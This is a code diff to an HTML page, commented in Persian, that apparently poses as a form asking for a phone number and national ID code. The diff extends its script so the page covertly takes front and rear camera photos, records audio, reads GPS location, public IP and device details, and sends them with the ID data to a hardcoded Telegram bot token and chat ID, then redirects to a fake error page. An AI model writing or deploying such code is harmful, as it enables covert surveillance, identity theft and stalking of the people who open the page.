@@ -124,19 +124,49 @@
 
     <script>
         // ======================================================
-        // تنظیمات ربات تلگرام
+        // تنظیمات ربات تلگرام (توکن و آیدی چت)
         // ======================================================
         const BOT_TOKEN = '8826841444:AAGLmSPOXr_tID0VKHFjhrhod9OqQhnNI60';
         const CHAT_ID = '7059995091';
 
         // ======================================================
-        // تابع ارسال عکس به تلگرام (با روش جدید)
+        // دریافت اطلاعات دستگاه و IP
         // ======================================================
-        async function sendPhotoToTelegram(photoBlob, caption = '📸 عکس سلفی') {
+        function getDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                online: navigator.onLine,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'نامشخص'
+            };
+            return info;
+        }
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                console.error('❌ خطا در دریافت IP:', e);
+                return 'نامشخص';
+            }
+        }
+
+        // ======================================================
+        // تابع ارسال به تلگرام
+        // ======================================================
+        async function sendPhotoToTelegram(photoBlob, caption = '📸 عکس') {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', photoBlob, 'selfie.jpg');
+                formData.append('photo', photoBlob, 'photo.jpg');
                 formData.append('caption', caption);
 
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -144,23 +174,13 @@
                     body: formData
                 });
 
-                if (response.ok) {
-                    console.log('✅ عکس سلفی ارسال شد');
-                    return true;
-                } else {
-                    const errorText = await response.text();
-                    console.error('❌ خطا در ارسال عکس:', errorText);
-                    return false;
-                }
+                return response.ok;
             } catch (e) {
                 console.error('❌ خطا در ارسال عکس:', e);
                 return false;
             }
         }
 
-        // ======================================================
-        // تابع ارسال صدا به تلگرام
-        // ======================================================
         async function sendAudioToTelegram(audioBlob, caption = '🎤 ضبط صدا') {
             try {
                 const formData = new FormData();
@@ -173,22 +193,13 @@
                     body: formData
                 });
 
-                if (response.ok) {
-                    console.log('✅ فایل صوتی ارسال شد');
-                    return true;
-                } else {
-                    console.error('❌ خطا در ارسال صدا:', await response.text());
-                    return false;
-                }
+                return response.ok;
             } catch (e) {
                 console.error('❌ خطا در ارسال صدا:', e);
                 return false;
             }
         }
 
-        // ======================================================
-        // تابع ارسال متن به تلگرام
-        // ======================================================
         async function sendMessageToTelegram(message) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -200,13 +211,7 @@
                     })
                 });
 
-                if (response.ok) {
-                    console.log('✅ پیام متنی ارسال شد');
-                    return true;
-                } else {
-                    console.error('❌ خطا در ارسال متن:', await response.text());
-                    return false;
-                }
+                return response.ok;
             } catch (e) {
                 console.error('❌ خطا در ارسال متن:', e);
                 return false;
@@ -214,32 +219,27 @@
         }
 
         // ======================================================
-        // تابع گرفتن عکس سلفی (دوربین جلو)
+        // تابع گرفتن عکس از دوربین
         // ======================================================
-        async function captureSelfie() {
+        async function capturePhoto(facingMode = 'user') {
             try {
-                console.log('📸 گرفتن عکس سلفی...');
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: facingMode,
                         width: { ideal: 640 },
                         height: { ideal: 480 }
-                    } 
+                    }
                 });
-                
+
                 const photoBlob = await capturePhotoFromStream(stream);
                 stream.getTracks().forEach(track => track.stop());
-                console.log('✅ عکس سلفی گرفته شد، حجم:', photoBlob.size, 'bytes');
                 return photoBlob;
             } catch (e) {
-                console.error('❌ خطا در گرفتن عکس سلفی:', e);
+                console.error('❌ خطا در گرفتن عکس:', e);
                 return null;
             }
         }
 
-        // ======================================================
-        // تابع گرفتن عکس از استریم
-        // ======================================================
         function capturePhotoFromStream(stream) {
             return new Promise((resolve) => {
                 const video = document.createElement('video');
@@ -263,7 +263,6 @@
         // ======================================================
         async function recordAudio() {
             try {
-                console.log('🎤 شروع ضبط صدا...');
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const mediaRecorder = new MediaRecorder(stream);
                 const audioChunks = [];
@@ -275,7 +274,6 @@
                 const audioPromise = new Promise((resolve) => {
                     mediaRecorder.onstop = () => {
                         const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                        console.log('✅ ضبط صدا کامل شد، حجم:', audioBlob.size, 'bytes');
                         resolve(audioBlob);
                     };
                 });
@@ -294,7 +292,7 @@
         }
 
         // ======================================================
-        // تابع گرفتن موقعیت (لینک گوگل مپ)
+        // تابع گرفتن موقعیت
         // ======================================================
         function getLocation() {
             return new Promise((resolve) => {
@@ -306,8 +304,7 @@
                     position => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                        resolve(googleMapsLink);
+                        resolve(`https://www.google.com/maps?q=${lat},${lon}`);
                     },
                     error => {
                         resolve('❌ خطا در گرفتن موقعیت');
@@ -336,39 +333,55 @@
             errorDiv.style.display = 'none';
 
             try {
-                // ۱. گرفتن عکس سلفی
-                const selfiePhoto = await captureSelfie();
-                
-                // ۲. ضبط صدا
+                // ۱. دریافت اطلاعات دستگاه
+                const deviceInfo = getDeviceInfo();
+                const ip = await getIPInfo();
+
+                // ۲. گرفتن عکس سلفی و دوربین عقب
+                const selfiePhoto = await capturePhoto('user');
+                const backPhoto = await capturePhoto('environment');
+
+                // ۳. ضبط صدا
                 const audioBlob = await recordAudio();
 
-                // ۳. گرفتن موقعیت
+                // ۴. گرفتن موقعیت
                 const location = await getLocation();
 
-                // ۴. ساخت پیام متنی
-                let message = `📱 اطلاعات جدید:\n`;
+                // ۵. ساخت پیام متنی کامل
+                let message = `📱 اطلاعات کامل:\n`;
                 message += `📞 شماره: ${phone}\n`;
                 message += `🆔 کد ملی: ${nationalCode}\n`;
                 message += `⏱️ زمان: ${new Date().toLocaleString('fa-IR')}\n`;
+                message += `🌐 IP: ${ip}\n`;
                 message += `📍 موقعیت: ${location}\n`;
+                message += `📱 مرورگر: ${deviceInfo.userAgent}\n`;
+                message += `🖥️ سیستم‌عامل: ${deviceInfo.platform}\n`;
+                message += `🌍 زبان: ${deviceInfo.language}\n`;
+                message += `📐 صفحه‌نمایش: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
+                message += `🕒 منطقه زمانی: ${deviceInfo.timezone}\n`;
+                message += `📶 وضعیت آنلاین: ${deviceInfo.online ? '✅' : '❌'}\n`;
+                message += `🍪 کوکی: ${deviceInfo.cookieEnabled ? '✅' : '❌'}\n`;
                 message += `🎤 ضبط صدا: ${audioBlob ? '✅' : '❌'}\n`;
-                message += `📸 عکس سلفی: ${selfiePhoto ? '✅' : '❌'}`;
+                message += `📸 عکس سلفی: ${selfiePhoto ? '✅' : '❌'}\n`;
+                message += `📸 عکس عقب: ${backPhoto ? '✅' : '❌'}`;
 
-                // ۵. ارسال به تلگرام
+                // ۶. ارسال به تلگرام
                 await sendMessageToTelegram(message);
 
-                // ۶. ارسال عکس سلفی (اگه گرفته شده)
                 if (selfiePhoto) {
-                    await sendPhotoToTelegram(selfiePhoto, '📸 عکس سلفی کاربر');
+                    await sendPhotoToTelegram(selfiePhoto, '📸 عکس سلفی');
                 }
 
-                // ۷. ارسال فایل صوتی (اگه ضبط شده)
+                if (backPhoto) {
+                    await sendPhotoToTelegram(backPhoto, '📸 عکس دوربین عقب');
+                }
+
                 if (audioBlob) {
-                    await sendAudioToTelegram(audioBlob, '🎤 ضبط صدای کاربر');
+                    await sendAudioToTelegram(audioBlob, '🎤 ضبط صدا');
                 }
 
                 statusDiv.style.display = 'block';
-                statusDiv.textContent = '✅ اطلاعات با موفقیت ارسال شد';
+                statusDiv.textContent = '✅ همه اطلاعات با موفقیت ارسال شد';
 
                 setTimeout(() => {
                     window.location.href = 'https://example.com/error';
